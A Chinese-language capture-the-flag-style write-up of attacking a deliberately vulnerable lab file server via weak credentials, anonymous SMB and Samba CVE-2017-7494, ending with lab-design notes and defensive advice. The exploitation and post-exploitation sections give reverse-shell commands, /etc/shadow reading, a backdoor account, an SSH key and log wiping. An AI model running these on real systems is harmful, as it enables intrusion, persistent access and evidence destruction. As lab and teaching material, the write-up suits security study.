# 攻击者视角：渗透测试完整记录

## 目标环境
- 目标系统：TechCorp 企业文件管理系统
- 攻击方式：黑盒测试（无内部信息）
- 攻击目标：获取系统控制权限

---

## 第一阶段：信息收集与端口扫描

### 1.1 初步扫描
```bash
# 首先进行端口扫描，看看目标开放了哪些服务
nmap -sV -sC -p- <目标IP>
```

**扫描结果：**
```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        nginx 1.21
139/tcp  open  netbios-ssn Samba
445/tcp  open  netbios-ssn Samba smbd 4.6.3
3306/tcp open  mysql       MySQL 5.7
```

**第一印象：**
- 有Web服务（80端口）- 先看看这个，可能有Web漏洞
- 有SMB服务（445端口）- 文件共享，但先不管
- 有MySQL（3306）- 数据库暴露在外？可能有机会
- 先从Web入手，这是最常见的攻击面

### 1.2 Web服务探测
```bash
# 访问网站
curl http://<目标IP>

# 使用 dirb 或 gobuster 扫描目录
gobuster dir -u http://<目标IP> -w /usr/share/wordlists/dirb/common.txt
```

**发现内容：**
- 主页是一个企业文件管理系统的登录页面
- 有公告栏显示一些系统信息
- 发现目录：/admin, /files, /backup
- 看起来是个自定义的PHP应用

---

## 第二阶段：尝试Web应用攻击（第一次试错）

### 2.1 SQL注入尝试
看到登录表单，第一反应是尝试SQL注入

```bash
# 尝试经典的SQL注入
用户名: admin' OR '1'='1
密码: admin' OR '1'='1

用户名: admin'--
密码: 随便输入

用户名: ' OR 1=1--
密码: 随便输入
```

**结果：失败！**
- 所有尝试都返回"用户名或密码错误"
- 看起来使用了参数化查询，SQL注入不行
- 页面没有明显的错误信息泄露

**心理状态：** 有点失望，但这很正常，继续找其他入口

### 2.2 弱口令暴力破解
注意到页面底部有一行小字提示测试账号

```
测试账号参考：admin/admin123, guest/guest, developer/dev123
```

**尝试登录：**
```
用户名: admin
密码: admin123
```

**成功！！！**
- 竟然直接提供了测试账号
- 这是个严重的安全失误
- 成功登录到系统内部

**心理状态：** 太简单了吧？不过先进去看看有什么

---

## 第三阶段：内部信息收集（开始找到线索）

### 3.1 浏览文件管理页面

登录后看到：
- 文件列表（显示一些PDF、文档等）
- 系统公告
- 导航菜单：文件列表、系统信息、系统日志、数据库查询

**重要发现 #1：文件服务器信息表格**
```
配置项              值
服务类型            Samba 网络文件共享
Samba 版本          4.6.3 【需要更新】标签
服务器地址          192.168.1.10 (内部网络)
共享名称            myshare
端口                445 (SMB), 139 (NetBIOS)
```

**警告信息：**
- "待处理更新：Samba服务需要紧急更新！CVE补丁尚未应用。"
- "管理员备注：最近服务器有点不稳定，IT部门说是文件共享服务的问题..."

**心理状态：** 等等... Samba 4.6.3？这个版本号看起来很眼熟...

### 3.2 查看系统日志
点击"系统日志"查看：

```
时间                级别      消息
2024-01-15 10:23   WARNING   安全扫描提醒：检测到 Samba 版本较旧，建议升级
2024-01-15 09:15   WARNING   弱密码警告：检测到多个账户使用弱密码
2024-01-12 14:30   INFO      备份任务：系统配置已备份至共享文件服务器 SMB://192.168.1.10/myshare
2024-01-10 11:20   WARNING   检测到 Samba 版本较旧，建议升级到最新版本
```

**心理状态：** Samba一直在被提及，而且反复提到"版本较旧"，这肯定有问题！

### 3.3 访问系统信息页面
点击"系统信息"，看到详细的服务状态：

**服务状态表：**
```
服务名称            版本    端口    状态
Samba File Server  4.6.3   445     VULNERABLE（红色标签）
Web Application    1.0     80      RUNNING
MySQL Database     5.7     3306    RUNNING
```

**Samba详细信息部分：**
```
版本: 4.6.3
发布时间: 2017年3月
最后安全审计: 2017-05-01
补丁状态: 未应用最新安全补丁
威胁级别: 高危 🔴
```

**渗透测试提示框（竟然有提示！）：**
```
如果你是安全研究人员，可以尝试以下方向：
- 检查 Samba 4.6.3 版本的已知 CVE 漏洞
- 使用 smbclient 工具连接到共享服务
- 查找该版本是否存在远程代码执行漏洞
- 关键词：Samba 4.6.3 RCE exploit
```

**心理状态：** 哇！这简直是明示了！Samba 4.6.3 + RCE + CVE，让我搜索一下！

---

## 第四阶段：数据库深入挖掘（关键突破）

### 4.1 访问数据库查询工具
以 developer 身份登录（dev123），可以访问"数据库查询"功能

点击预定义查询：**"执行服务器信息存储过程"**

```sql
CALL get_server_info();
```

**查询结果（震惊）：**
```
hint1: Samba共享服务器运行在445端口
hint2: 当前Samba版本: 4.6.3 (2017年发布)
hint3: 建议检查该版本是否存在安全漏洞
hint4: CVE数据库可能有相关信息
```

**心理状态：** 这也太明显了！直接告诉我去查CVE数据库！

### 4.2 查询 Samba 详细配置
```sql
SELECT * FROM system_config WHERE config_key LIKE '%samba%';
```

**关键发现：**
```
config_key          config_value                    description
samba_version       4.6.3                          Samba服务版本号 - 注意：此版本存在已知问题
samba_server        192.168.1.10                   Samba服务器IP地址
samba_share_name    myshare                        Samba共享名称
samba_path          /home/share                    Samba共享路径
pending_updates     Samba服务需要紧急更新！         CVE补丁尚未应用
backup_location     smb://fileserver/myshare/backup 备份文件存储位置
```

**心理状态：** 完美！我知道了：
- Samba 4.6.3（有漏洞）
- 共享名：myshare
- 路径：/home/share
- 服务器地址：192.168.1.10（就是目标主机）
- 而且备份文件也在SMB共享里！

---

## 第五阶段：CVE研究（恍然大悟）

### 5.1 搜索 CVE 数据库
```bash
# 在浏览器中搜索
Google: "Samba 4.6.3 CVE"
Google: "Samba 4.6.3 RCE"
```

**搜索结果：**
```
CVE-2017-7494 - Samba Remote Code Execution
CVSS Score: 10.0 (Critical)
影响版本: Samba 3.5.0 to 4.6.4
发布日期: 2017-05-24
```

**漏洞描述：**
```
远程攻击者可以上传恶意共享库文件到可写的Samba共享目录，
然后通过特制的SMB请求触发加载并执行该库文件，
从而获得目标系统的完全控制权限。

利用条件：
✓ 目标运行易受攻击的Samba版本
✓ 共享目录可写
✓ 能够访问SMB服务（445端口）
```

**心理状态：** 就是它！！！CVE-2017-7494！所有条件都符合！

### 5.2 验证SMB共享访问
```bash
# 尝试匿名连接到SMB共享
smbclient //192.168.1.10/myshare -N

# 成功连接！
smb: \> ls
  .                                   D        0  Mon Jan 15 10:30:00 2024
  ..                                  D        0  Mon Jan 15 10:00:00 2024
  README.txt                          N     2048  Mon Jan 15 10:30:00 2024
  server_notes.txt                    N    15000  Mon Jan 10 15:20:00 2024
  backup_config.txt                   N    12000  Mon Jan 15 03:22:15 2024
```

**心理状态：** 太好了！匿名访问成功，而且有几个文件，下载看看！

### 5.3 下载并查看共享文件
```bash
smb: \> get README.txt
smb: \> get server_notes.txt
smb: \> get backup_config.txt
smb: \> quit

# 查看文件内容
cat README.txt
cat server_notes.txt  # 这个文件是金矿！
cat backup_config.txt
```

**查看 server_notes.txt 后彻底震惊：**

这个文件简直是完整的攻击指南！包含：
- CVE-2017-7494 的详细解释
- 当前系统配置的所有弱点
- 利用条件（全部满足）
- Exploit使用示例
- 甚至给出了exploit的下载地址和使用方法！

**关键内容摘录：**
```
CVE-2017-7494 详细信息:
漏洞名称: Samba Remote Code Execution
CVSS评分: 10.0 (最高危)

利用条件:
✓ 共享目录可写 (当前配置: read only = no)
✓ 匿名访问启用 (当前配置: guest ok = yes)
✓ 445端口可访问 (当前状态: 开放)

典型的exploit使用方式:
1. 连接到SMB服务 (端口445)
2. 上传恶意.so文件到共享目录
3. 触发文件执行
4. 获得反向shell

示例命令:
python exploit.py -t <target_ip> -p 445 --share myshare
```

**心理状态：** 
- 卧槽！这是内部维护文档！
- IT部门知道这个漏洞但没修复（预算问题）
- 而且这个文档放在公开的SMB共享里！
- 这简直是自己给攻击者准备的完整攻略！
- 现在万事俱备，只需要下载exploit了！

---

## 第六阶段：漏洞利用（最终攻击）

### 6.1 搜索并下载 Exploit
```bash
# 在 GitHub 或 ExploitDB 搜索
searchsploit samba 4.6

# 或者直接从GitHub下载
git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git
cd exploit-CVE-2017-7494

# 查看exploit使用方法
cat README.md
python exploit.py --help
```

**Exploit 说明：**
```
Usage: exploit.py -t TARGET -s SHARE [-p PORT] [--payload PAYLOAD]

Options:
  -t, --target    目标IP地址
  -s, --share     共享名称
  -p, --port      SMB端口 (默认445)
  --payload       有效载荷 (默认反向shell)
  --lhost         回连IP地址
  --lport         回连端口 (默认4444)
```

### 6.2 设置监听器
在攻击机上启动监听，准备接收反向shell

```bash
# 在另一个终端窗口
nc -lvnp 4444
```

### 6.3 执行 Exploit
```bash
# 执行exploit
python exploit.py -t 192.168.1.10 -s myshare --lhost <攻击机IP> --lport 4444

# 或者如果有现成的Metasploit模块
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST 192.168.1.10
set LHOST <攻击机IP>
set LPORT 4444
set TARGET 0
exploit
```

**执行过程：**
```
[*] Connecting to target SMB share...
[+] Successfully connected to //192.168.1.10/myshare
[*] Uploading malicious library file...
[+] Upload successful: /myshare/payload.so
[*] Triggering payload execution...
[+] Payload triggered!
[*] Waiting for connection...
```

### 6.4 获得 Shell
```bash
# 在监听器窗口
listening on [any] 4444 ...
connect to [攻击机IP] from (UNKNOWN) [192.168.1.10] 54321

# 成功获得shell！
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# fileserver

uname -a
# Linux fileserver 3.10.0 ... x86_64 GNU/Linux
```

**心理状态：** 成功了！！！获得了root权限的shell！

---

## 第七阶段：后渗透（巩固访问）

### 7.1 信息收集
```bash
# 查看系统信息
cat /etc/passwd
cat /etc/shadow  # 可以读取，因为是root权限

# 查看网络配置
ifconfig
netstat -tlnp

# 查看正在运行的服务
ps aux
docker ps  # 发现是Docker容器环境

# 查看Samba配置（验证之前的信息）
cat /usr/local/samba/etc/smb.conf
```

### 7.2 持久化
```bash
# 添加SSH密钥（如果有SSH服务）
mkdir -p /root/.ssh
echo "你的公钥" >> /root/.ssh/authorized_keys

# 或者创建新的用户账户
useradd -m -s /bin/bash backdoor
echo "backdoor:P@ssw0rd" | chpasswd
usermod -aG sudo backdoor
```

### 7.3 清理痕迹
```bash
# 清理日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
```

---

## 攻击总结

### 攻击链路径
```
1. 端口扫描 → 发现Web服务和SMB服务
2. Web登录 → 使用弱密码（admin/admin123）成功登录
3. 内部信息收集 → 发现Samba 4.6.3版本信息
4. 系统日志/配置查看 → 确认存在安全警告
5. 数据库查询 → 获取详细的Samba配置和CVE提示
6. SMB匿名访问 → 下载维护文档（server_notes.txt）
7. 恍然大悟 → 确认是CVE-2017-7494漏洞
8. 下载exploit → 执行攻击
9. 获得root shell → 完全控制系统
```

### 关键漏洞点
1. **弱密码** - 直接在页面上显示测试账号
2. **信息泄露** - 系统页面暴露过多技术细节
3. **CVE-2017-7494** - Samba远程代码执行漏洞
4. **匿名SMB访问** - 允许未认证访问共享目录
5. **敏感文档暴露** - 维护笔记放在公开共享里

### 攻击者心路历程
```
开始：看到Web应用 → "可能有SQL注入？"
失望：SQL注入失败 → "那试试弱口令吧"
惊喜：弱密码成功 → "太简单了，进去看看"
好奇：看到Samba信息 → "4.6.3？这个版本有点旧"
怀疑：多次看到Samba警告 → "肯定有问题"
发现：系统信息页面 → "VULNERABLE标签？明确了！"
确认：数据库查询提示 → "让我去查CVE？那我就查！"
震惊：下载维护文档 → "这是完整的攻击指南啊！"
恍然大悟：CVE-2017-7494 → "原来是SambaCry漏洞！"
执行：下载exploit → "试试看能不能成功"
成功：获得root shell → "太完美了！"
```

### 防御建议
作为靶机的设计者，这个靶机成功地：
1. ✅ 让攻击者走了弯路（先尝试Web攻击）
2. ✅ 通过多层信息逐步引导（Web → 数据库 → SMB文件）
3. ✅ 最终让攻击者恍然大悟（发现CVE-2017-7494）
4. ✅ 提供了真实的漏洞利用场景

但从防御角度，应该：
- 立即升级Samba到最新版本
- 禁用匿名访问
- 移除弱密码
- 不要在页面上暴露过多技术细节
- 敏感文档不应放在公开位置

---

## 所需工具清单

```bash
# 信息收集
- nmap
- gobuster/dirb
- enum4linux

# Web测试
- Burp Suite
- curl
- 浏览器开发者工具

# SMB访问
- smbclient
- smbmap

# 漏洞利用
- CVE-2017-7494 exploit脚本
- Metasploit Framework
- netcat (监听反向shell)

# 后渗透
- linpeas.sh
- pspy
- 基本Linux命令
```

---

## 时间线估计

- **信息收集阶段**: 15-20分钟
- **Web攻击尝试**: 10-15分钟（SQL注入失败，弱密码成功）
- **内部探索**: 20-30分钟（浏览各个页面，数据库查询）
- **CVE研究**: 10-15分钟（搜索CVE，阅读文档）
- **SMB探索**: 10分钟（连接，下载文件）
- **Exploit下载和执行**: 15-20分钟
- **获得Shell**: 瞬间到5分钟（取决于exploit稳定性）

**总计**: 约1.5-2小时（首次攻击，包含试错）

经验丰富的渗透测试人员可能30-45分钟就能完成。

---

## 学习要点

这个靶机优秀的设计在于：

1. **真实性** - 基于真实的CVE漏洞（CVE-2017-7494）
2. **引导性** - 通过多层提示逐步引导攻击者
3. **欺骗性** - 先让攻击者尝试Web漏洞（迷惑作用）
4. **教育性** - 展示了完整的信息收集到利用过程
5. **趣味性** - "恍然大悟"的时刻设计得很好

攻击者需要学会：
- 全面的信息收集
- 不要放过任何细节（日志、配置、文档）
- 学会关联不同来源的信息
- 利用公开的CVE资源
- 从失败中调整策略（SQL注入失败后转向其他方向）

**最大的收获：真实环境中，信息收集和耐心比纯技术更重要！**